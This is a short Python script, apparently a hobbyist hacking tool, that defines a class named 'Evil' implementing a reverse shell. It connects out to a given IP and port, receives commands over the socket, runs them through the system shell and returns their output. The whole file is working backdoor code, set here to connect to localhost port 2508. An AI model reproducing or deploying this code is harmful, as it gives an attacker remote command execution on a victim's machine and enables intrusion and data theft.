#!/usr/bin/env python

# Created by un4ckn0wl3z-level99
# Website -> www.un4ckn0wl3z.xyz
# Date -> 7/28/2018

import socket
import subprocess


class Evil:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send("\n[+] connection established.\n")

    def exec_sys_cmd(self,cmd):
        return subprocess.check_output(cmd,shell=True)

    def run(self):
        while True:
            try:
                cmd = self.connection.recv(1024)
                cmd_result = self.exec_sys_cmd(cmd)
                if not cmd_result:
                    self.connection.send("System command exception")
                    continue
                self.connection.send(cmd_result)
            except Exception:
                self.connection.send("Something wrong...")
                continue

        self.connection.close()

evil = Evil("127.0.0.1",2508)
evil.run()